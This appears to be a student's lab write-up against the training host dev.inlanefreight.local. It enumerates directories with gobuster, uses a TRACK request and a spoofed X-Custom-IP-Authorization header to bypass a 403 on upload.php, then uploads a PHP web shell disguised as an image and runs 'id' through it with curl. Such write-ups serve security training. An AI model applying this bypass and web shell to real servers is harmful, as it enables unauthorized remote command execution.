dev.inlanefreight.local
after brutforiing the direocoty 
```bash
╰─$ gobuster dir -u http://dev.inlanefreight.local/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x .php       
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.inlanefreight.local/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta.php             (Status: 403) [Size: 288]
/.htpasswd            (Status: 403) [Size: 288]
/.htaccess.php        (Status: 403) [Size: 288]
/.htpasswd.php        (Status: 403) [Size: 288]
/.htaccess            (Status: 403) [Size: 288]
/.hta                 (Status: 403) [Size: 288]
/css                  (Status: 301) [Size: 332] [--> http://dev.inlanefreight.local/css/]
Progress: 3137 / 9470 (33.13%)[ERROR] Get "http://dev.inlanefreight.local/dvd.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dev.inlanefreight.local/dwr": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dev.inlanefreight.local/dumps.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dev.inlanefreight.local/dvd": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dev.inlanefreight.local/dumpuser.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dev.inlanefreight.local/dumpuser": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 3143 / 9470 (33.19%)[ERROR] Get "http://dev.inlanefreight.local/dyn": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dev.inlanefreight.local/dwr.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 3145 / 9470 (33.21%)[ERROR] Get "http://dev.inlanefreight.local/dyn.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dev.inlanefreight.local/dynamic": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 3147 / 9470 (33.23%)[ERROR] Get "http://dev.inlanefreight.local/dyop_addtocart": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dev.inlanefreight.local/dyop_delete.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dev.inlanefreight.local/dyop_delete": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dev.inlanefreight.local/dyop_addtocart.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dev.inlanefreight.local/dyop_quan": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dev.inlanefreight.local/dynamic.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 3153 / 9470 (33.29%)[ERROR] Get "http://dev.inlanefreight.local/dyop_quan.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dev.inlanefreight.local/e": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/images               (Status: 301) [Size: 335] [--> http://dev.inlanefreight.local/images/]
/index.php            (Status: 200) [Size: 2048]
/index.php            (Status: 200) [Size: 2048]
/js                   (Status: 301) [Size: 331] [--> http://dev.inlanefreight.local/js/]
/server-status        (Status: 403) [Size: 288]
/upload.php           (Status: 200) [Size: 14]
/uploads              (Status: 301) [Size: 336] [--> http://dev.inlanefreight.local/uploads/]
Progress: 9468 / 9470 (99.98%)
```
we find the` /upload.php `and `/uploads `
let try with open  http://dev.inlanefreight.local/upload.php  
![[Pasted image 20260207202841.png]]
we get 403 Forbidden 
let  use options  with burt suit to show the avilebale  methods
```bash
OPTIONS /upload.php HTTP/1.1
Host: dev.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```
![[Pasted image 20260207202956.png]]
we see the  TRACK in `Allow: GET,POST,PUT,TRACK,OPTIONS`
let use it 
```bash
TRACK /upload.php HTTP/1.1
Host: dev.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```
we get` X-Custom-IP-Authorization: 172.18.0.1` . palying arounf  it  by  chnaging  ip  to `127.0.0.1`  
```bash
TRACK /upload.php HTTP/1.1
Host: dev.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
X-Custom-IP-Authorization: 127.0.0.1
Content-Length: 4


```
![[Pasted image 20260207203225.png]]
we get valid resposne , and we will disply in in the browser by ueing `show response in browser`
 and copy the  url provied by burb suit and past it in our browser 
 ![[Pasted image 20260207203501.png]]
we success access the restricted upload page.

now we will select an image and using burt to intersept the image upload reqest and change the image content and the iamge file  exntetion  to  an   php web shell ` <?php system($_REQUEST['cmd']); ?>` 

```bash
POST /upload.php HTTP/1.1
Host: dev.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------58094647517406505172037383693
Content-Length: 362
Origin: http://dev.inlanefreight.local
Connection: keep-alive
Referer: http://dev.inlanefreight.local/upload.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------58094647517406505172037383693
Content-Disposition: form-data; name="file"; filename="pic.php"
Content-Type: image/png

<?php system($_REQUEST['cmd']); ?>

-----------------------------58094647517406505172037383693
Content-Disposition: form-data; name="submit"


-----------------------------58094647517406505172037383693--
```
we get` File uploaded /uploads/pic.p ` indicated we success uplado our webshell 
let confirming our web shell  are working by excuting `id`commnad 
```bash
curl 'http://dev.inlanefreight.local/uploads/pic.php?cmd=id'       
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
we get file uplaod attack 